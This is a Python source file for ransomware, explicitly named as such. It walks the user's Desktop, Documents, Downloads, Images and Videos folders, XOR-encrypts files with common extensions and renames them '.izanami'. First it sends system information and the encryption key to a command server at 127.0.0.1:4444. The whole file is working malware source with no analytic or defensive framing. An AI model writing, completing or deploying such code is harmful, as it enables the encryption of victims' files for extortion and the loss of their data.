from threading import Thread
from xLib import client,cryptography,sysinformation
import queue 
import os 


class MainClass:
    def __init__(self,host,port):
        self.host = host 
        self.port = port 
        
    # Set Extensions and Paths
    def set_extensions(self):
        self.new_extension = ".izanami"
        self.extensions = [".mp3",".mvk",".mp4",".odt",".doc",".docx",".txt",".rtf",".html",".css",".pptx",".dotx",".wav","pdf",".js",
        ".ico",".png",".sql",".zip",".jpg",".jpeg",".c",".cpp",".gif",".py"]
        self.paths = ["Desktop","Documents","Downloads","Images","Videos"]


    # Send Key & Systeminformations to Server
    def send_key(self):
        # Read System Informations
        system = sysinformation.ReadSystem()
        self.sysdata =  list(system.system_values()) 
        # Generate Key size == 512 bit  
        self.keyvalue = cryptography.generate_key()
        # Create Client instance 
        xclient = client.Client(self.host,self.port)
        xclient.connect_server()
        # Encrypt-Payload 
        for info in self.sysdata:
            xclient.send_payload(info + "\n")
        xclient.send_payload(self.keyvalue)


    # Get all files from path
    def get_paths(self):
        filepaths = queue.Queue()
        userprofile = os.getenv("USERPROFILE") 
        for path in self.paths:
            filepath = "{}//{}//".format(userprofile,path)
            for root,dirs,files in os.walk(r"{}".format(filepath)):
                for file in files:
                    filepath = "{}//{}".format(root,file)
                    for ext in self.extensions:
                        if filepath.endswith(ext):
                            filepaths.put(filepath)
        for file in filepaths.queue:
            cryptography.xor_system(file,self.keyvalue,self.new_extension)
       

def main():
    Ransomware = MainClass("127.0.0.1",4444)
    Ransomware.set_extensions()
    t = Thread(target=Ransomware.send_key()).start()
    t = Thread(target=Ransomware.get_paths()).start() 


if __name__=="__main__":
    main()
